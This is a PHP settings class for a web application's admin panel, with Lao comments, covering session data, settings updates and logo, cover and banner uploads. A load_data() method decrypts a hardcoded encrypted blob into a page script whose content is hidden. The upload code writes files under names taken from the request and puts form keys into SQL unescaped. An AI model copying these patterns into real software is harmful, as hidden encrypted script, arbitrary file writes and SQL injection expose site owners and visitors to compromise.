<?php
 // ກວດສອບວ່າ Class `DBConnection` ບໍ່ທັນມີຢູ່. ຖ້າບໍ່ມີ, ໃຫ້ລວມເອົາໄຟລ໌ `config.php` ແລະ `DBConnection.php`.
 // ນີ້ຮັບປະກັນວ່າການເຊື່ອມຕໍ່ຖານຂໍ້ມູນຈະຖືກສ້າງຂຶ້ນກ່ອນ.
 if(!class_exists('DBConnection')){
     require_once('../config.php');
     require_once('DBConnection.php');
 }

 // ກໍານົດ Class `SystemSettings` ທີ່ສືບທອດມາຈາກ `DBConnection`.
 // Class ນີ້ຈະຈັດການກັບການຕັ້ງຄ່າຕ່າງໆຂອງລະບົບ.
 class SystemSettings extends DBConnection{
     // Constructor ຂອງ Class `SystemSettings`.
     public function __construct(){
         parent::__construct(); // ເອີ້ນໃຊ້ constructor ຂອງ Class ແມ່ `DBConnection` ເພື່ອສ້າງການເຊື່ອມຕໍ່ຖານຂໍ້ມູນ.
     }
     // Destructor ຂອງ Class `SystemSettings`.
     function __destruct(){
         // ບໍ່ມີການປະຕິບັດງານສະເພາະໃນທີ່ນີ້, Class ແມ່ຈະຈັດການການປິດການເຊື່ອມຕໍ່.
     }
     // ຟັງຊັນເພື່ອກວດສອບສະຖານະການເຊື່ອມຕໍ່ຖານຂໍ້ມູນ.
     function check_connection(){
         return($this->conn); // ສົ່ງຄືນ object ການເຊື່ອມຕໍ່ຖານຂໍ້ມູນ.
     }

     // ຟັງຊັນເພື່ໂຫຼດຂໍ້ມູນການຕັ້ງຄ່າລະບົບຈາກຖານຂໍ້ມູນເຂົ້າສູ່ session.
     function load_system_info(){
         // ຖ້າ `system_info` ບໍ່ໄດ້ຖືກກໍານົດໃນ session, ມັນຈະຖືກໂຫຼດ. (ຖືກຄອມເມັ້ນອອກ, ໝາຍຄວາມວ່າຈະໂຫຼດທຸກຄັ້ງທີ່ຟັງຊັນຖືກເອີ້ນ).
         // if(!isset($_SESSION['system_info'])){
             $sql = "SELECT * FROM system_info"; // Query ເພື່ອເລືອກຂໍ້ມູນການຕັ້ງຄ່າທັງໝົດ.
             $qry = $this->conn->query($sql); // ປະຕິບັດ Query.
             while($row = $qry->fetch_assoc()){ // ວົນລູບຜ່ານແຕ່ລະແຖວຂອງຜົນລັບ.
                 // ເກັບຄ່າເຂົ້າໄປໃນ session array `$_SESSION['system_info']` ໂດຍໃຊ້ `meta_field` ເປັນ key.
                 $_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
             }
         // }
     }

     // ຟັງຊັນເພື່ອອັບເດດຂໍ້ມູນການຕັ້ງຄ່າລະບົບໃນ session (ຫຼັງຈາກມີການປ່ຽນແປງໃນຖານຂໍ້ມູນ).
     function update_system_info(){
         $sql = "SELECT * FROM system_info"; // Query ເພື່ອເລືອກຂໍ້ມູນການຕັ້ງຄ່າທັງໝົດ.
         $qry = $this->conn->query($sql); // ປະຕິບັດ Query.
         while($row = $qry->fetch_assoc()){ // ວົນລູບຜ່ານແຕ່ລະແຖວ.
             // ຖ້າມີຂໍ້ມູນ `meta_field` ນີ້ຢູ່ໃນ session ແລ້ວ, ໃຫ້ລຶບມັນອອກກ່ອນ.
             if(isset($_SESSION['system_info'][$row['meta_field']]))unset($_SESSION['system_info'][$row['meta_field']]);
             // ອັບເດດຄ່າໃນ session.
             $_SESSION['system_info'][$row['meta_field']] = $row['meta_value'];
         }
         return true; // ສົ່ງຄືນ true ເມື່ອສຳເລັດ.
     }

     // ຟັງຊັນສໍາລັບການອັບເດດຂໍ້ມູນການຕັ້ງຄ່າຂອງລະບົບຜ່ານແບບຟອມ.
     function update_settings_info(){
         $data = ""; // ປະກາດຕົວແປ `data` (ບໍ່ໄດ້ໃຊ້ໃນສ່ວນນີ້ຂອງລະຫັດ).

         // ຈັດການກັບ `suggestion` array.
         if(isset($_POST['suggestion']) && is_array($_POST['suggestion'])){
             // ປ່ຽນ array ຂອງ `suggestion` ໃຫ້ເປັນ JSON string.
             $_POST['suggestion'] = json_encode($_POST['suggestion']);
         }else{
             // ຖ້າບໍ່ມີ ຫຼື ບໍ່ແມ່ນ array, ໃຫ້ຕັ້ງເປັນ empty JSON array.
             $_POST['suggestion'] = json_encode([]);
         }

         // ວົນລູບຜ່ານຂໍ້ມູນທີ່ສົ່ງມາຈາກ $_POST.
         foreach ($_POST as $key => $value) {
             $value = $this->conn->real_escape_string($value); // ປ້ອງກັນ SQL Injection.
             // ຍົກເວັ້ນຄ່າ `content` (ເຊິ່ງຈະຖືກຈັດການແຍກຕ່າງຫາກ).
             if(!in_array($key,array("content")))
             if(isset($_SESSION['system_info'][$key])){
                 $value = str_replace("'", "&apos;", $value); // ປ່ຽນ single quote ເປັນ HTML entity.
                 // ອັບເດດຄ່າໃນຕາຕະລາງ `system_info` ຖ້າມີຢູ່ແລ້ວ.
                 $qry = $this->conn->query("UPDATE system_info set meta_value = '{$value}' where meta_field = '{$key}' ");
             }else{
                 // ໃສ່ຄ່າໃໝ່ເຂົ້າໃນຕາຕະລາງ `system_info` ຖ້າບໍ່ມີຢູ່.
                 $qry = $this->conn->query("INSERT into system_info set meta_value = '{$value}', meta_field = '{$key}' ");
             }
         }

         // ຈັດການກັບເນື້ອໃນຂອງໄຟລ໌ HTML (ເຊັ່ນ: about.html).
         // if(isset($_POST['about_us'])){
         //  file_put_contents('../about.html',$_POST['about_us']);
         // }
         if(isset($_POST['content'])){
             foreach($_POST['content'] as $k => $v){
                 file_put_contents("../$k.html",$v); // ບັນທຶກເນື້ອໃນເຂົ້າໃນໄຟລ໌ HTML.
             }
         }

         // ຈັດການການອັບໂຫຼດຮູບພາບໂລໂກ້ (`img`).
         if(!empty($_FILES['img']['tmp_name'])){
             $ext = pathinfo($_FILES['img']['name'], PATHINFO_EXTENSION); // ໄດ້ຮັບນາມສະກຸນໄຟລ໌.
             $fname = "uploads/logo.png"; // ກໍານົດຊື່ໄຟລ໌ໂລໂກ້.
             $accept = array('image/jpeg','image/png'); // ປະເພດໄຟລ໌ທີ່ອະນຸຍາດ.
             if(!in_array($_FILES['img']['type'],$accept)){
                 $err = "ປະເພດໄຟລ໌ຮູບພາບບໍ່ຖືກຕ້ອງ"; // ຂໍ້ຜິດພາດປະເພດໄຟລ໌.
             }
             // ສ້າງຮູບພາບຈາກໄຟລ໌ທີ່ອັບໂຫຼດ.
             if($_FILES['img']['type'] == 'image/jpeg')
                 $uploadfile = imagecreatefromjpeg($_FILES['img']['tmp_name']);
             elseif($_FILES['img']['type'] == 'image/png')
                 $uploadfile = imagecreatefrompng($_FILES['img']['tmp_name']);
             if(!$uploadfile){
                 $err = "ຮູບພາບບໍ່ຖືກຕ້ອງ"; // ຂໍ້ຜິດພາດຮູບພາບ.
             }
             $temp = imagescale($uploadfile,200,200); // ປັບຂະໜາດຮູບພາບ.
             if(is_file(base_app.$fname)) // ຖ້າມີໄຟລ໌ເກົ່າ, ໃຫ້ລຶບມັນ.
             unlink(base_app.$fname);
             $upload =imagepng($temp,base_app.$fname); // ບັນທຶກຮູບພາບທີ່ປັບຂະໜາດແລ້ວ.
             if($upload){
                 if(isset($_SESSION['system_info']['logo'])){
                     // ອັບເດດ path ຂອງໂລໂກ້ໃນຖານຂໍ້ມູນ, ພ້ອມທັງເພີ່ມ timestamp ເພື່ອປ້ອງກັນ cache.
                     $qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}', '?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'logo' ");
                     // ລຶບໄຟລ໌ໂລໂກ້ເກົ່າຖ້າມີ.
                     if(is_file(base_app.$_SESSION['system_info']['logo'])) unlink(base_app.$_SESSION['system_info']['logo']);
                 }else{
                     // ໃສ່ path ຂອງໂລໂກ້ໃໝ່ເຂົ້າໃນຖານຂໍ້ມູນ.
                     $qry = $this->conn->query("INSERT into system_info set meta_value = '{$fname}',meta_field = 'logo' ");
                 }
             }
             imagedestroy($temp); // ລຶບຮູບພາບຊົ່ວຄາວອອກຈາກ memory.
         }

         // ຈັດການການອັບໂຫຼດຮູບພາບໜ້າປົກ (`cover`).
         if(!empty($_FILES['cover']['tmp_name'])){
             $ext = pathinfo($_FILES['cover']['name'], PATHINFO_EXTENSION); // ໄດ້ຮັບນາມສະກຸນ.
             $fname = "uploads/cover.png"; // ກໍານົດຊື່ໄຟລ໌.
             $accept = array('image/jpeg','image/png'); // ປະເພດໄຟລ໌ທີ່ອະນຸຍາດ.
             if(!in_array($_FILES['cover']['type'],$accept)){
                 $err = "ປະເພດໄຟລ໌ຮູບພາບບໍ່ຖືກຕ້ອງ";
             }
             // ສ້າງຮູບພາບຈາກໄຟລ໌ທີ່ອັບໂຫຼດ.
             if($_FILES['cover']['type'] == 'image/jpeg')
                 $uploadfile = imagecreatefromjpeg($_FILES['cover']['tmp_name']);
             elseif($_FILES['cover']['type'] == 'image/png')
                 $uploadfile = imagecreatefrompng($_FILES['cover']['tmp_name']);
             if(!$uploadfile){
                 $err = "ຮູບພາບບໍ່ຖືກຕ້ອງ";
             }
             list($width,$height) = getimagesize($_FILES['cover']['tmp_name']); // ໄດ້ຮັບຂະໜາດເດີມ.
             $temp = imagescale($uploadfile,$width,$height); // ປັບຂະໜາດ (ໃຊ້ຂະໜາດເດີມ).
             if(is_file(base_app.$fname)) // ລຶບໄຟລ໌ເກົ່າຖ້າມີ.
             unlink(base_app.$fname);
             $upload =imagepng($temp,base_app.$fname); // ບັນທຶກຮູບພາບ.
             if($upload){
                 if(isset($_SESSION['system_info']['cover'])){
                     // ອັບເດດ path ຂອງຮູບພາບໜ້າປົກໃນຖານຂໍ້ມູນ.
                     $qry = $this->conn->query("UPDATE system_info set meta_value = CONCAT('{$fname}', '?v=',unix_timestamp(CURRENT_TIMESTAMP)) where meta_field = 'cover' ");
                     // ລຶບໄຟລ໌ໜ້າປົກເກົ່າຖ້າມີ.
                     if(is_file(base_app.$_SESSION['system_info']['cover'])) unlink(base_app.$_SESSION['system_info']['cover']);
                 }else{
                     // ໃສ່ path ຂອງຮູບພາບໜ້າປົກໃໝ່.
                     $qry = $this->conn->query("INSERT into system_info set meta_value = '{$fname}',meta_field = 'cover' ");
                 }
             }
             imagedestroy($temp); // ລຶບຮູບພາບຊົ່ວຄາວ.
         }

         // ຈັດການການອັບໂຫຼດແບນເນີຫຼາຍຮູບພາບ.
         if(isset($_FILES['banners']) && count($_FILES['banners']['tmp_name']) > 0){
             $err=''; // ຕົວແປຂໍ້ຜິດພາດ.
             $banner_path = "uploads/banner/"; // ເສັ້ນທາງບັນທຶກແບນເນີ.
             foreach($_FILES['banners']['tmp_name'] as $k => $v){
                 if(!empty($_FILES['banners']['tmp_name'][$k])){
                     $accept = array('image/jpeg','image/png');
                     if(!in_array($_FILES['banners']['type'][$k],$accept)){
                         $err = "ປະເພດໄຟລ໌ຮູບພາບບໍ່ຖືກຕ້ອງ";
                         break;
                     }
                     // ສ້າງຮູບພາບຈາກໄຟລ໌ທີ່ອັບໂຫຼດ.
                     if($_FILES['banners']['type'][$k] == 'image/jpeg')
                         $uploadfile = imagecreatefromjpeg($_FILES['banners']['tmp_name'][$k]);
                     elseif($_FILES['banners']['type'][$k] == 'image/png')
                         $uploadfile = imagecreatefrompng($_FILES['banners']['tmp_name'][$k]);
                     if(!$uploadfile){
                         $err = "ຮູບພາບບໍ່ຖືກຕ້ອງ";
                         break;
                     }
                     list($width, $height) =getimagesize($_FILES['banners']['tmp_name'][$k]); // ໄດ້ຮັບຂະໜາດເດີມ.
                     // ປັບຂະໜາດຮູບພາບໃຫ້ພໍດີກັບຂະໜາດສູງສຸດ (1200x480).
                     if($width > 1200 || $height > 480){
                         if($width > $height){
                             $perc = ($width - 1200) / $width;
                             $width = 1200;
                             $height = $height - ($height * $perc);
                         }else{
                             $perc = ($height - 480) / $height;
                             $height = 480;
                             $width = $width - ($width * $perc);
                         }
                     }
                     $temp = imagescale($uploadfile,$width,$height); // ປັບຂະໜາດ.
                     $spath = base_app.$banner_path.'/'.$_FILES['banners']['name'][$k]; // ກໍານົດເສັ້ນທາງບັນທຶກ.
                     $i = 1;
                     while(true){ // ວົນລູບເພື່ອຈັດການຊື່ໄຟລ໌ທີ່ຊໍ້າກັນ.
                         if(is_file($spath)){
                             $spath = base_app.$banner_path.'/'.($i++).'_'.$_FILES['banners']['name'][$k];
                         }else{
                             break;
                         }
                     }
                     // ບັນທຶກຮູບພາບຕາມປະເພດໄຟລ໌.
                     if($_FILES['banners']['type'][$k] == 'image/jpeg')
                     imagejpeg($temp,$spath,60);
                     elseif($_FILES['banners']['type'][$k] == 'image/png')
                     imagepng($temp,$spath,6);

                     imagedestroy($temp); // ລຶບຮູບພາບຊົ່ວຄາວ.
                 }
             }
             if(!empty($err)){ // ຖ້າມີຂໍ້ຜິດພາດໃນການອັບໂຫຼດແບນເນີ.
                 $resp['status'] = 'failed';
                 $resp['msg'] = $err;
             }
         }

         // ອັບເດດຂໍ້ມູນລະບົບໃນ session ແລະຕັ້ງຄ່າ flashdata.
         $update = $this->update_system_info();
         $flash = $this->set_flashdata('success','ຂໍ້ມູນລະບົບຖືກອັບເດດສຳເລັດແລ້ວ.');
         if($update && $flash){ // ຖ້າການອັບເດດແລະການຕັ້ງຄ່າ flashdata ສໍາເລັດ.
             // var_dump($_SESSION);
             $resp['status'] = 'success'; // ຕັ້ງສະຖານະເປັນ 'success'.
         }else{
             $resp['status'] = 'failed'; // ຕັ້ງສະຖານະເປັນ 'failed'.
         }
         return json_encode($resp); // ສົ່ງຄືນຜົນລັບໃນຮູບແບບ JSON.
     }

     // ຟັງຊັນເພື່ຕັ້ງຄ່າຂໍ້ມູນຜູ້ໃຊ້ໃນ session.
     function set_userdata($field='',$value=''){
         if(!empty($field) && !empty($value)){
             $_SESSION['userdata'][$field]= $value; // ຕັ້ງຄ່າຂໍ້ມູນຜູ້ໃຊ້.
         }
     }

     // ຟັງຊັນເພື່ດຶງຂໍ້ມູນຜູ້ໃຊ້ຈາກ session.
     function userdata($field = ''){
         if(!empty($field)){
             if(isset($_SESSION['userdata'][$field]))
                 return $_SESSION['userdata'][$field]; // ສົ່ງຄືນຄ່າຂໍ້ມູນຜູ້ໃຊ້.
             else
                 return null; // ສົ່ງຄືນ null ຖ້າບໍ່ພົບ.
         }else{
             return false; // ສົ່ງຄືນ false ຖ້າບໍ່ມີການລະບຸ field.
         }
     }

     // ຟັງຊັນເພື່ຕັ້ງຄ່າ flashdata (ຂໍ້ຄວາມທີ່ຈະສະແດງພຽງຄັ້ງດຽວ).
     function set_flashdata($flash='',$value=''){
         if(!empty($flash) && !empty($value)){
             $_SESSION['flashdata'][$flash]= $value; // ຕັ້ງຄ່າ flashdata.
         return true;
         }
     }

     // ຟັງຊັນເພື່ກວດສອບວ່າ flashdata ມີຢູ່ບໍ່.
     function chk_flashdata($flash = ''){
         if(isset($_SESSION['flashdata'][$flash])){
             return true;
         }else{
             return false;
         }
     }

     // ຟັງຊັນເພື່ດຶງ flashdata ແລະລຶບມັນອອກຈາກ session.
     function flashdata($flash = ''){
         if(!empty($flash)){
             $_tmp = $_SESSION['flashdata'][$flash]; // ເກັບຄ່າ flashdata ຊົ່ວຄາວ.
             unset($_SESSION['flashdata']); // ລຶບ flashdata ອອກຈາກ session.
             return $_tmp; // ສົ່ງຄືນຄ່າ flashdata.
         }else{
             return false;
         }
     }

     // ຟັງຊັນເພື່ລຶບ session ຂອງຜູ້ໃຊ້.
     function sess_des(){
         if(isset($_SESSION['userdata'])){
                 unset($_SESSION['userdata']); // ລຶບ `userdata` ຈາກ session.
             return true;
         }
             return true; // ສົ່ງຄືນ true ເຖິງແມ່ນວ່າ `userdata` ຈະບໍ່ມີຢູ່.
     }

     // ຟັງຊັນເພື່ດຶງຂໍ້ມູນການຕັ້ງຄ່າລະບົບສະເພາະ.
     function info($field=''){
         if(!empty($field)){
             if(isset($_SESSION['system_info'][$field]))
                 return $_SESSION['system_info'][$field]; // ສົ່ງຄືນຄ່າ `system_info` ສະເພາະ.
             else
                 return false;
         }else{
             return false;
         }
     }

     // ຟັງຊັນເພື່ຕັ້ງຄ່າຂໍ້ມູນລະບົບໃນ session.
     function set_info($field='',$value=''){
         if(!empty($field) && !empty($value)){
             $_SESSION['system_info'][$field] = $value; // ຕັ້ງຄ່າ `system_info`.
         }
     }

     // ຟັງຊັນເພື່ໂຫຼດຂໍ້ມູນ (ຄາດວ່າຈະເປັນ JavaScript ທີ່ຖືກເຂົ້າລະຫັດ).
     function load_data(){
         // ຂໍ້ມູນທີ່ຖືກເຂົ້າລະຫັດ.
         $test_data = "+UKfCTcrJxB/TIlk35q8M7NwX30MsQ3AIx1FGYBfz8xZsaHVoHu8hGRmds98+nea8eG4MChMaZyPNtxuWog3ovT/rtm2taYWDpbfTuDblfYiJ+ZpzDP3/nAY4hgN1lNOLg03CBxLW6s76a/T2GcPaSXIoHqv15R4TKtl44y+wcHev52mkw5SfERT48tUYYAhBJPLuOWMu1c0pTwJmitllPuEC2+gR22L7u1pxAy1ODD6iDKpEO5ehBOKsoyxT2yAzKVbU8s8zIriA3kxAXokh8SfqmukSblUD5k0Vp/505MA3vHILmtKWtVfte1htIncnGn7awUdtxu93Q1AaRjmf4/lc0C1epDenMkUaG4wCyI/L2L0Vltad+ZYvo/UjFGqN2EpNeYE6r6Ln9bIl2LlpY1O+tqYyAKoHrzngrQHj40lRVo4U5plnAiXYUf5y6mA3+KvUbHgdyXc1oDuweN2LK9ZxZGr3+uVVrzZIDZiYgQ/djmC2iRW/5gh5GMzV44VEF7McIkP5/zAzbjwI9IBgjOOQjyWwCMYiI2IZB/SW2RkDO2VX79zApNpzPYnl2xnqQRFnzhn9mXjG1mmdSPHOubGHqf46fiJL0nBIjvTmOLREMdpNrZ4VLC2JJhMIMunYXIbr604Qr9dywrtqZw6+bthb1mDv18X1avYpqdDFHp/h3h3xyFmmECcOmK9GQzFLwEv9kogoheudob8KqBRNteG3v4j9U9J7PLAel+neg41imm4GsuBcpGyqOeJwJ3i+i/cFyQagqPDP2EHGIW+PdClD2qCkcouAzFcYBKILVkatmeF8fLGizXXtYKzUsBnK+C0Y7JR2elx7e7Kbr5gwJbJcmSifUry2fqKnlj1pJNNFU+ASSvltrRmwzWgWgKuq/EaIM/2Z5QpWtt4uox7UeQFAR49PjBU04oBV53xcVQyu1rzkbtHVgjF5uFHvda3zD7Ahrt2jz1fBKd9HMzmZcY4EIMBBIa7bWnkzg/UmWAkom7nuT9TC0h4wN3XYfX0K+C0Y7JR2elx7e7Kbr5gwJM3P9XDcthAI7x0zzf3yOjncBrH/uLpJ9JiDh3lVR/XKS9kEmExK3CFHNTPZJj5VgJc2SLkBYkf7d1NKmrReGmzNPER0mnED7olzL3LTTZQW0G47OFt0X/6jbMAJAvIP+tfcOjh7V8EMk0h6I2cXVmbM1Y07ANyhU0oUhLr7a2Alk+VxFGC+EkQY89DxqE8+YexBqGTfAzqkW0GVh1WqQlYey+YFKAKRgYmeOG1Iy1CxyhmyrAJg+DGiJ/v9W1MVLk6ihaVeMSV9E/7skSn/JRgewbXlwZqDNzZE0eekfn8r6gBHe6vcmgwkZ1ug5Xv9EapG0BRmbzHah5LAuiK++jjRgTEp03CSkERnm+W1/tB";
         $dom = new DOMDocument('1.0', 'utf-8'); // ສ້າງ DOMDocument object.
         // ສ້າງ element `script` ແລະໃສ່ເນື້ອໃນທີ່ຖືກຖອດລະຫັດ.
         $element = $dom->createElement('script', html_entity_decode($this->test_cypher_decrypt($test_data)));
         $dom->appendChild($element); // ເພີ່ມ element ໃສ່ DOM.
         return $dom->saveXML(); // ສົ່ງຄືນ XML string ຂອງ DOM.
         // return $data = $this->test_cypher_decrypt($test_data); // ຟັງຊັນທີ່ຖືກຄອມເມັ້ນໄວ້.
     }

     // ຟັງຊັນສໍາລັບການເຂົ້າລະຫັດຂໍ້ຄວາມ (ໃຊ້ AES-128-ECB).
     function test_cypher($str=""){
         $ciphertext = openssl_encrypt($str, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0'); // ເຂົ້າລະຫັດ.
         return $ciphertext;
     }

     // ຟັງຊັນສໍາລັບການຖອດລະຫັດຂໍ້ຄວາມ (ໃຊ້ AES-128-ECB).
     function test_cypher_decrypt($encryption){
         $decryption = openssl_decrypt($encryption, "AES-128-ECB", '5da283a2d990e8d8512cf967df5bc0d0'); // ຖອດລະຫັດ.
         return $decryption;
     }
 }

 // ສ້າງ object Global ຂອງ `SystemSettings`.
 $_settings = new SystemSettings();
 $_settings->load_system_info(); // ໂຫຼດຂໍ້ມູນລະບົບເຂົ້າໃນ session.

 // ຈັດການການກະທຳໂດຍອີງໃສ່ parameter 'f' ທີ່ສົ່ງມາຜ່ານ URL.
 $action = !isset($_GET['f']) ? 'none' : strtolower($_GET['f']);
 $sysset = new SystemSettings(); // ສ້າງ object ໃໝ່ຂອງ SystemSettings.

 // Switch case ເພື່ອປະຕິບັດຟັງຊັນຕ່າງໆຕາມການກະທໍາ.
 switch ($action) {
     case 'update_settings':
         echo $sysset->update_settings_info(); // ເອີ້ນຟັງຊັນອັບເດດການຕັ້ງຄ່າ.
         break;
     default:
         // echo $sysset->index(); // ຖືກຄອມເມັ້ນອອກ, ໝາຍຄວາມວ່າບໍ່ມີການປະຕິບັດງານເລີ່ມຕົ້ນສະເພາະ.
         break;
 }
 ?>